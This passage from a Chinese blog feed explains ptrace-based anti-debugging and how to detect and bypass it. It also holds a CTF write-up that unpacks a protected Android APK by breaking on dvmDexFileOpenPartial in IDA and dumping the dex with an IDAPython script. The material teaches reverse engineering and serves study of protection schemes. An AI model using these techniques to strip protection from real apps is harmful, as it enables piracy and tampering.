href="http://xxxx:1080" target="_blank" rel="noopener">http://xxxx:1080</a><br>这个1080其实就是那个本地端口，一般我们都是设置1080的。</p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ptrace反调试之抢占ptrace</title>
      <link href="/2018/02/01/ptrace/"/>
      <url>/2018/02/01/ptrace/</url>
      <content type="html"><![CDATA[<blockquote><p>The ptrace() system call provides a means by which one process (the”tracer”) may observe and control the execution of another process(the “tracee”), and examine and change the tracee’s memory andregisters. It is primarily used to implement breakpoint debugging and system call tracing.</p></blockquote><p><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">帮助文档</a></p><h2 id="ptrace和debugger原理"><a href="#ptrace和debugger原理" class="headerlink" title="ptrace和debugger原理"></a>ptrace和debugger原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪.<br>函数原型:<br><code>long ptrace(int request, pid_t pid, void * addr, void * data)</code><br>其中,request代表请求类型,pid代表被调试进程的pid.</p><h3 id="部分ptrace-request和wait"><a href="#部分ptrace-request和wait" class="headerlink" title="部分ptrace request和wait"></a>部分ptrace request和wait</h3><ul><li>PTRACE_TRACEME<br>表示本进程将被其父进程跟踪，交付给这个进程的所有信号（除SIGKILL之外），都将使其停止，父进程将通过wait()获知这一情况。<br>它通常总是与 fork/exec 一起使用。对于每一个进程，PTRACE_TRACEME 只能被调用一次。</li><li>PTRACE_ATTACH<br>根据pid将调试进程附加到被调试进程上,PTRACE_ATTACH向被调试进程发送SIGSTOP信号使之停下.<br>但是在ptrace(PTRACE_ATTACH,pid,0,0)执行完毕时被调试进程可能还没有暂停,可以使用waitpid()等待其停下.</li><li>PTRACE_DETACH<br>将被调试进程与调试进程分离,使被调试进程正常运行.</li><li>PTRACE_SYSCALL<br>使被调试进程继续运行,但是在下一个系统调用的入口处或出口处停下,或者是执行完一条指令后停下.<br>例如,调试进程可以监视被调试进程系统调用入口处的参数,接着再使用SYSCALL,监视系统调用的返回值.</li><li>wait()<br>wait函数会延迟父进程的执行，直到被调试的进程切换为停止状态或者终止为止.</li></ul><h3 id="调试器建立调试关系的两种方式"><a href="#调试器建立调试关系的两种方式" class="headerlink" title="调试器建立调试关系的两种方式:"></a>调试器建立调试关系的两种方式:</h3><p>用gdb调试程序，可以直接gdb ./test,也可以gdb <pid>(test的进程号)。这对应着使用ptrace建立跟踪关系的两种方式:</pid></p><ul><li>fork:利用fork+execve执行被测试的程序，子进程在执行execve之前调用ptrace(PTRACE_TRACEME)，建立了与父进程(debugger)的跟踪关系。</li><li>attach: debugger可以调用ptrace(PTRACE_ATTACH，pid,…)，建立自己与进程号为pid的进程间的跟踪关系。即利用PTRACE_ATTACH，使自己变成被调试程序的父进程(用ps可以看到)。用attach建立起来的跟踪关系，可以调用ptrace(PTRACE_DETACH，pid,…)来解除。注意attach进程时的权限问题，如一个非root权限的进程是不能attach到一个root进程上的。</li></ul><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>ptrace被广泛用于反调试,因为一个进程只能被ptrace一次,如果事先调用了ptrace方法,那就可以防止别人调试我们的程序.</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试程序:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Hello Ptrace!\n"</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译:<code>gcc -g -o hello-ptrace hello-ptrace.c</code></p><p>运行并用gdb调试，发现已经被抢占，不能attach</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0e0mwjabj30sl0lk135.jpg" alt=""></p><p>已经由于PTRACE_TRACEME，被父进程trace</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0elwfbgmj30jo0isjvh.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0f058ljqj30g5014dfv.jpg" alt=""></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys/ptrace.h&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if(-1 == ptrace(PTRACE_TRACEME))</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Debugger!\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Hello Ptrace!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fo0f49zmkjj30ks0bjq8n.jpg" alt=""></p><h2 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h2><p>ptrace用户态源码(位于bionic/libc/bionic/ptrace.c):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> * addr, <span class="keyword">void</span> * data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (request) &#123;</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKUSR:</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line">        <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">long</span> word;</span><br><span class="line">            <span class="keyword">long</span> ret;</span><br><span class="line">            ret = __ptrace(request, pid, addr, &amp;word);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> word;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// __ptrace will set errno for us</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">             <span class="keyword">return</span> __ptrace(request, pid, addr, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0表示成功,-1表示错误.</p><ul><li>单个应用可在ptrace下断点.</li><li>定制ROM,可以将ptrace源代码修改为如果是自己的pid调用ptrace,返回-1;否则返回0.</li></ul>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>脱壳基础 dvmDexFileOpenPartial</title>
      <link href="/2018/02/01/ali_re3/"/>
      <url>/2018/02/01/ali_re3/</url>
      <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a href="http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/" target="_blank" rel="noopener">http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/</a><br><a href="http://blog.csdn.net/jiangwei0910410003/article/details/48104581" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/48104581</a></p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk</a><br>可能是因为赛题是14年的，有点老了，所以在5.0.1上运行失败，用android 4.4.4就可以运行了。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h3><p>现在市场中加固apk的方式一般就是两种：一种是对源apk整体做一个加固，放到指定位置，运行的时候在解密动态加载，还有一种是对so进行加固，在so加载内存的时候进行解密释放。我们今天主要看第一种加固方式，就是对apk整体进行加固。<br>当我们发现apk中主要的类都没有了，肯定是apk被加固了，加固的源程序肯定是在本地，一般会有这么几个地方需要注意的：<br>1、应用程序的asset目录，我们知道这个目录是不参与apk的资源编译过程的，所以很多加固的应用喜欢把加密之后的源apk放到这里<br>2、把源apk加密放到壳的dex文件的尾部，这个肯定不是我们这里的案例，但是也有这样的加固方式，<strong>这种加固方式会发现使用dex2jar工具解析dex是失败的</strong>，我们这时候就知道了，肯定对dex做了手脚<br>3、把源apk加密放到so文件中，这个就比较难了，一般都是把源apk进行拆分，存到so文件中，分析难度会加大的。</p><h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p>不管上层怎么加固，最终加载到内存的dex肯定不是加固的，所以这个dex就是我们想要的.</p><h3 id="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex"><a href="#为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex" class="headerlink" title="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?"></a>为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?</h3><p>dalvik虚拟机会把dex文件优化为odex文件,而优化的源代码为<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Main entry point.  Decide where to go.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--zip"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromZip(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--dex"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromDex(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--preopt"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> preopt(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中fromzip和preopt都会调用processZipFile先将dex文件提取出来,fromDex则直接调用dvmContinueOptimization优化.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Common functionality for normal device-side processing as well as</span></span><br><span class="line"><span class="comment"> * preoptimization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">processZipFile</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd, <span class="keyword">const</span> <span class="keyword">char</span>* zipName,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *dexoptFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">    <span class="keyword">int</span> result = extractAndProcessZip(zipFd, cacheFd, zipName, isBootstrap,</span><br><span class="line">            bcp, dexoptFlags);</span><br><span class="line">    <span class="built_in">free</span>(bcpCopy);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在extractAndProcessZip中处理zip文件并将dex提取出来,随后调用优化函数<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extract "classes.dex" from zipFd into "cacheFd", leaving a little space</span></span><br><span class="line"><span class="comment"> * up front for the DEX optimization header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">extractAndProcessZip</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* debugFileName, <span class="keyword">bool</span> isBootstrap, <span class="keyword">const</span> <span class="keyword">char</span>* bootClassPath,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* dexoptFlagStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Open the zip archive, find the DEX entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipPrepArchive(zipFd, debugFileName, &amp;zippy) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: unable to open zip archive '%s'"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    zipEntry = dexZipFindEntry(&amp;zippy, kClassesDex);</span><br><span class="line">    <span class="keyword">if</span> (zipEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive '%s' does not include %s"</span>,</span><br><span class="line">            debugFileName, kClassesDex);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract some info about the zip entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipGetEntryInfo(&amp;zippy, zipEntry, <span class="literal">NULL</span>, &amp;uncompLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;modWhen, &amp;crc32) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive GetEntryInfo failed on %s"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    uncompLen = uncompLen;</span><br><span class="line">    modWhen = modWhen;</span><br><span class="line">    crc32 = crc32;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract the DEX data into the cache file at the current offset.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipExtractEntryToFile(&amp;zippy, zipEntry, cacheFd) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: extraction of %s from %s failed"</span>,</span><br><span class="line">            kClassesDex, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prep the VM and perform the optimization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode,</span><br><span class="line">            dexoptFlags) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"DexOptZ: VM init failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//vmStarted = 1;</span></span><br><span class="line">    <span class="comment">/* do the optimization */</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmContinueOptimization(cacheFd, dexOffset, uncompLen, debugFileName,</span><br><span class="line">            modWhen, crc32, isBootstrap))</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Optimization failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dvmContinueOptimization函数位于/dalvik/vm/analysis/DexPrepare.cpp文件,其中调用了dvmDexFileOpenPartial.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do the actual optimization. This is executed in the dexopt process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For best use of disk/memory, we want to extract once and perform</span></span><br><span class="line"><span class="comment"> * optimizations in place. If the file has to expand or contract</span></span><br><span class="line"><span class="comment"> * to match local structure padding/alignment expectations, we want</span></span><br><span class="line"><span class="comment"> * to do the rewrite as part of the extract, rather than extracting</span></span><br><span class="line"><span class="comment"> * into a temp file and slurping it back out. (The structure alignment</span></span><br><span class="line"><span class="comment"> * is currently correct for all platforms, and this isn't expected to</span></span><br><span class="line"><span class="comment"> * change, so we should be okay with having it already extracted.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns "true" on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dvmContinueOptimization</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> dexOffset, <span class="keyword">long</span> dexLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* fileName, u4 modWhen, u4 crc, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,</span><br><span class="line">                    doVerify, doOpt, &amp;pClassLookup, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            DvmDex* pDvmDex = <span class="literal">NULL</span>;</span><br><span class="line">            u1* dexAddr = ((u1*) mapAddr) + dexOffset;</span><br><span class="line">            <span class="keyword">if</span> (dvmDexFileOpenPartial(dexAddr, dexLength, &amp;pDvmDex) != <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Unable to create DexFile"</span>);</span><br><span class="line">                success = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dvmDexFileOpenPartial调用了dexFileParse,用来解析内存中优化过或未优化过的dex文件,返回dexFile结构.<br>所以此时dex文件已经被加载进内存,就可以dump出来了.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a DexFile structure for a "partial" DEX. This is one that is in</span></span><br><span class="line"><span class="comment"> * the process of being optimized. The optimization header isn't finished</span></span><br><span class="line"><span class="comment"> * and we won't have any of the auxillary data tables, so we have to do</span></span><br><span class="line"><span class="comment"> * the initialization slightly differently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns nonzero on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenPartial</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* addr, <span class="keyword">int</span> len, DvmDex** ppDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DvmDex* pDvmDex;</span><br><span class="line">    DexFile* pDexFile;</span><br><span class="line">    <span class="keyword">int</span> parseFlags = kDexParseDefault;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* -- file is incomplete, new checksum has not yet been calculated</span></span><br><span class="line"><span class="comment">    if (gDvm.verifyDexChecksum)</span></span><br><span class="line"><span class="comment">        parseFlags |= kDexParseVerifyChecksum;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pDexFile = dexFileParse((u1*)addr, len, parseFlags);</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"DEX parse failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="赛题分析"><a href="#赛题分析" class="headerlink" title="赛题分析"></a>赛题分析</h2><h3 id="jeb打开apk，查看Manifest"><a href="#jeb打开apk，查看Manifest" class="headerlink" title="jeb打开apk，查看Manifest"></a>jeb打开apk，查看Manifest</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bvqfxcnj31je0ngacl.jpg" alt=""></p><h3 id="反编译查看源代码"><a href="#反编译查看源代码" class="headerlink" title="反编译查看源代码"></a>反编译查看源代码</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bzdzyitj31d00oewg7.jpg" alt=""></p><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>asset目录中的jar文件被处理了，打不开，也不知道处理逻辑<br>libs目录中的三个so文件，唯一加载了libmobisec.so文件了<br>所以说被加固的源程序可能存在于so文件，也可能存在于asset文件里。</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><h3 id="得到libdvm-so文件"><a href="#得到libdvm-so文件" class="headerlink" title="得到libdvm.so文件"></a>得到libdvm.so文件</h3><p><code>adb pull /system/lib/libdvm.so</code></p><h3 id="在dvmDexFileOpenPartial下断点"><a href="#在dvmDexFileOpenPartial下断点" class="headerlink" title="在dvmDexFileOpenPartial下断点"></a>在dvmDexFileOpenPartial下断点</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0c9qazoaj30x409ltck.jpg" alt=""></p><h3 id="IDA-attach并断下"><a href="#IDA-attach并断下" class="headerlink" title="IDA attach并断下"></a>IDA attach并断下</h3><p>adb shell am start -D -n com.ali.tg.testapp/.MainActivity<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cmoer7bj30zl073gp5.jpg" alt=""><br>dvmDexFileOpenPartial函数的第一个参数就是dex内存起始地址，第二个参数就是dex大小。<br>R0:0x753EF008<br>R1:0x000941FC</p><h3 id="dump脚本"><a href="#dump脚本" class="headerlink" title="dump脚本"></a>dump脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">start_addr=<span class="number">0x753EF008</span></span><br><span class="line">fike_len=<span class="number">0x000941FC</span></span><br><span class="line">data=idaapi.dbg_read_memory(start_addr,fike_len)</span><br><span class="line">f=open(<span class="string">r'dump.dex'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cpgd28kj30zu0n4wjs.jpg" alt=""></p><h3 id="反编译dex为smali，进行分析"><a href="#反编译dex为smali，进行分析" class="headerlink" title="反编译dex为smali，进行分析"></a>反编译dex为smali，进行分析</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0d78f8gsj31im0xy41l.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>阿里EVIL_APK_3 部分writeup（脱壳）</title>
      <link href="/2018/02/01/ALICTF_evalapk_3/"/>
      <url>/2018/02/01/ALICTF_evalapk_3/</url>
